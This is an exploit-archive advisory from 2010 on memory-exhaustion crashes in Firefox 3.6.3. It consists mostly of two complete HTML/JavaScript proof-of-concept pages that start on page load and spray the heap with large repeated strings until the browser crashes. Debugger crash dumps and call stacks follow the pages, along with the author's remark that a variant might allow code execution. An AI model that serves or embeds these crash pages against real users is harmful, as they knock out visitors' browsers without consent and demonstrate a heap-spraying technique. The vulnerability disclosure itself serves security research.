@@ -1,0 +1,323 @@
+id: 12329
+date: 05/21/2010
+title: Firefox 3.6.3 (latest) <= memory exhaustion crash vulnerabilities
+author: x90c
+cves: 
+
+=================================================================
+Firefox 3.6.3 (latest) <= memory exhaustion crash vulnerabilities
+=================================================================
+
+
+Title: Firefox 3.6.3 (latest) <= memory exhaustion crash vulnerabilities
+ 
+0x01. Description:
+Memory exhaustion of Firefox 3.6.3 (latest) <= makes firefox can't make texts into body element and then it crashed.
+( raise exception using PoC #1, lower memory area read access violation using PoC #2 )
+Ofcourse an variation PoC made NULL Pointer deref so may also could be code execution ( 0.1 % ). :-)
+ 
+URL: http://www.x90c.org/advisories/firefox_3.6.3_crash_advisory.txt
+ 
+Vendor Status: unpatched. ( to now... doesn't exists any reliable exploit so i disclosed to bugtraq firstly )
+ 
+0x02. Proof of Concepts:
+ 
+[PoC #1 - firefox_3.6.3_dos_poc_1.htm] --
+<HTML>
+<HEAD>
+<SCRIPT LANGUAGE="javascript">
+ 
+// Mozilla Firefox <= 3.6.3 (Win32) 0Day DoS Proof-of-Concept #1
+//
+// o Summary:
+// After loading this PoC, about 40 seconds later triggered.
+// Crashes are occured at a same location.
+//
+// --
+// 7c7e2af5 ff1510157d7c    call    dword ptr [kernel32!_imp__RtlRaiseException (7c7d1510)]
+//                                  ds:0023:7c7d1510={ntdll!RtlRaiseException (7c93e528)} ( raised )
+//
+// ##### 100% same below crash. exception raised. #####
+// (f34.850): C++ EH exception - code e06d7363 (first chance)
+// (f34.850): C++ EH exception - code e06d7363 (!!! second chance !!!)
+// eax=0012aa58 ebx=01000121 ecx=00000000 edx=781d7ba8 esi=0012aae0 edi=2f900008
+// eip=7c7e2afb esp=0012aa54 ebp=0012aaa8 iopl=0         nv up ei pl nz na pe nc
+// cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+// kernel32!RaiseException+0x53:
+// 7c7e2afb 5e              pop     esi
+// --
+//
+// Call Stack:
+// 00 0012aa28 7815c54b e06d7363 00000001 00000003 kernel32!RaiseException+0x53
+// WARNING: Stack unwind information not available. Following frames may be wrong.
+// 01 0012aa60 78164f33 0012aa70 781caa24 781ac11c MOZCRT19!CxxThrowException+0x46
+// 02 0012aa78 100cd464 08c00060 0012b1a0 21500008 MOZCRT19!operator new+0x73
+// 03 00000000 00000000 00000000 00000000 00000000 xul!gfxWindowsFontGroup::MakeTextRun+0x54
+ 
+// Trace:
+// MOZCRT19!operator new:
+//    78164ec0 8b442404        mov     eax,dword ptr [esp+4]
+//    78164ec4 83ec0c          sub     esp,0Ch
+//    78164ec7 50              push    eax
+//    78164ec8 e8134bfdff      call    MOZCRT19!malloc (781399e0)
+//  ...
+//    78164f26 c74424081cc11a78 mov     dword ptr [esp+8],offset MOZCRT19!exception::`vftable'+0xc14 (781ac11c)
+//    78164f2e e8d275ffff      call    MOZCRT19!CxxThrowException (7815c505)    ; Throw Exception.
+//    78164f33 83c40c          add     esp,0Ch
+//    78164f36 c3              ret
+//
+// MOZCRT19!CxxThrowException:
+//    7815c505 55              push    ebp
+//    7815c506 8bec            mov     ebp,esp
+//    7815c508 83ec20          sub     esp,20h
+//  ...
+//    7815c545 ff15e4911a78    call    dword ptr [MOZCRT19!modf+0x87d4 (781a91e4)] ds:0023:781a91e4=
+//              {kernel32!RaiseException (7c7e2aa9)} ; Raise Exception!
+//
+// o Impact: DoS ( Exception Raise )
+//
+// o Tested on:
+//      - MS Win XP SP3 (ko)
+//      - Mozilla Firefox 3.6.3 (Win32) (ko)
+//        ( Mozilla/5.0, rv:1.9.2.3, Gecko/20100401 )
+//
+// P.S: This vulnerability similer with the CVE-2009-1571 [1] but it's patched on Firefox 3.6
+//      so this is *not the same vulnerability*!
+//
+// [1] CVE-2009-1571 ( Credit: Alin Rad Pop of Secunia ) - Thanks to Alin Rad Pop.
+//     - http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1571
+//
+// o Discovered by x90c in INetCop(c) Security during analysis.
+// o Discovered date: 2010.03.04
+// o Personal homepage: http://www.x90c.org
+//
+// Greets to Xpl017Elz(x82), rebel
+//
+ 
+function append_text_into_body()
+{
+    var p1 = document.getElementById('p1');
+    var Text1 = "";
+    var TextNode = null;
+ 
+    // Trigger! MakeFont... into p element on body element.
+    for(var i = 0; i < 0x700000 / 4; i++)
+    {
+        Text1 = Text1 + "AAAA";
+    }
+ 
+    TextNode = document.createTextNode(Text1);
+    p1.appendChild(TextNode);   // Memory Exhaustion makes FireFox can't make Texts it caused an crash.
+}
+ 
+var arr1, arr2, arr3, arr4, arr5;
+var a = 1;
+ 
+var timer;
+ 
+function fill_all_memory()
+{
+    var chunk = unescape("%u4141%u4141");
+    var i = 0;
+ 
+    if( a > 5 )
+    {
+        a++;
+    }
+    if(a >= 30)
+    {
+        append_text_into_body();
+    }
+ 
+    while(chunk.length <= 0x400000)
+    {
+        chunk = chunk + chunk;
+    }
+    chunk = chunk + chunk + chunk;
+    chunk = chunk.substring(0, chunk.length);
+ 
+    if(a == 1)
+    {
+        arr1 = new Array();
+        for(i = 0; i < 0xd0; i++)
+        {
+            arr1[i] = chunk;
+        }
+        a = 2;
+    }
+    else if(a == 2)
+    {
+        arr2 = new Array();
+        for(i = 0; i < 0xd0; i++)
+        {
+            arr2[i] = chunk;
+        }
+        a = 3;
+    }
+    else if(a == 3)
+    {
+        arr3 = new Array();
+        for(i = 0; i < 0xd0; i++)
+        {
+            arr3[i] = chunk;
+        }
+        a = 4;
+    }
+    else if(a == 4)
+    {
+        arr4 = new Array();
+        for(i = 0; i < 0xd0; i++)
+        {
+            arr4[i] = chunk;
+        }
+        a = 5;
+    }
+    else if(a == 5)
+    {
+        arr5 = new Array();
+        for(i = 0; i < 0xd0; i++)
+        {
+            arr5[i] = chunk;
+        }
+        a = 6;
+    }
+}
+ 
+function try_fill()
+{
+    fill_all_memory();
+    setTimeout("try_fill();", 500);
+}
+ 
+</SCRIPT>
+</HEAD>
+ 
+<BODY onload="try_fill();">
+<P id='p1'></P>
+</BODY>
+</HTML>
+ 
+<!-- [ eoc ] -->
+ 
+ 
+[PoC #2 - firefox_3.6.3_dos_poc_2.htm] --
+ 
+<HTML>
+<HEAD>
+<SCRIPT LANGUAGE="javascript">
+ 
+// Mozilla Firefox <= 3.6.3 (Win32) 0Day DoS Proof-of-Concept #2
+//
+// o Summary:
+// After loading this PoC, about 40 seconds later triggered.
+// Crashes are occured at a same location.
+//
+// --
+// #####  almost 99% below crash #####
+// (f0c.8b4): Access violation - code c0000005 (first chance)
+// First chance exceptions are reported before any exception handling.
+// This exception may be expected and handled.
+// eax=0012aab8 ebx=00002226 ecx=000042a4 edx=000000ee esi=00003ce8 edi=000000ee
+// eip=73f937cd esp=0012a3fc ebp=0012a3fc iopl=0         nv up ei pl zr na pe nc
+// cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
+// USP10!DoubleWideCharMappedString::operator[]+0x1f:
+// 73f937cd 0fb70448        movzx   eax,word ptr [eax+ecx*2] ds:0023:00133000=???? ( beside stack area and unmapped )
+// --
+//
+// 0:000> kp
+// ChildEBP RetAddr 
+// 0012a3fc 73f99a42 USP10!DoubleWideCharMappedString::operator[]+0x1f
+// 0012a4cc 73f92d34 USP10!ScriptTokenize+0x91
+// 0012a4f4 100efc30 USP10!ScriptItemize+0x42
+// WARNING: Stack unwind information not available. Following frames may be wrong.
+// 0012a5a0 7813807d xul!gfxWindowsFontGroup::GetUnderlineOffset+0x4cb0
+// 00000000 00000000 MOZCRT19!expand+0x37d
+//
+// o Impact: DoS ( may also code execution )
+//
+// o Tested on:
+//      - MS Win XP SP3 (ko)
+//      - Mozilla Firefox 3.6.3 (Win32) (ko)
+//        ( Mozilla/5.0, rv:1.9.2.3, Gecko/20100401 )
+//
+// P.S: This vulnerability similer with the CVE-2009-1571 [1] but it's patched on Firefox 3.6
+//      so this is *not the same vulnerability*! and this makes same crash with [2]
+//
+// [1] CVE-2009-1571 ( Credit: Alin Rad Pop of Secunia ) - Thanks to Alin Rad Pop.
+//     - http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1571
+//
+// [2] All browsers 0day Crash Exploit ( Inj3ct0r Team )
+//     - http://www.exploit-db.com/exploits/12491
+//
+// o Discovered by x90c in INetCop(c) Security during analysis.
+// o Discovery date: 2010.03.04
+// o Personal homepage: http://www.x90c.org
+//
+// Greets to Xpl017Elz(x82), rebel
+//
+ 
+function append_text_into_body()
+{
+    var p1 = document.getElementById('p1');
+    var Text1 = "";
+    var TextNode = null;
+ 
+    // Trigger! MakeFont... into p element on body element.
+    for(var i = 0; i < 0x700000 / 4; i++)
+    {
+        Text1 = Text1 + "AAAA";
+    }
+ 
+    TextNode = document.createTextNode(Text1);
+    p1.appendChild(TextNode);   // Memory Exhaustion makes FireFox can't make Texts it caused an crash.
+}
+ 
+var a = 1;
+ 
+var timer;
+ 
+function fill_all_memory()  // This function's variation can makes an null pointer deref without append_text_into_body() calling.
+{
+    var chunk = unescape("%u4141%u4242");
+    var i = 0;
+ 
+    append_text_into_body();
+ 
+    while(chunk.length <= 0x400000)
+    {
+        chunk = chunk + chunk;
+    }
+    chunk = chunk + chunk + chunk;
+    chunk = chunk.substring(0, chunk.length);
+}
+ 
+function try_fill()
+{
+    fill_all_memory();
+    // this poc makes 99% almost crashed same location as below.
+    // 10: USP10!DoubleWideCharMappedString::operator[]+0x1f:
+    //     73f937cd 0fb70448        movzx   eax,word ptr [eax+ecx*2] ds:0023:00133000=????
+    // 100: ''
+    // 150: ''
+    // 200: ''
+    // 300: ''
+    // 500: ''
+    // 1000: ''
+    // 5000: ''
+    setTimeout("try_fill();", 10);
+}
+ 
+</SCRIPT>
+</HEAD>
+ 
+<BODY onload="try_fill();">
+<P id='p1'></P>
+</BODY>
+ 
+</HTML>
+ 
+<!-- [ eoc ] -->
+
+
+
+#  0day.today [2023-03-26]  #
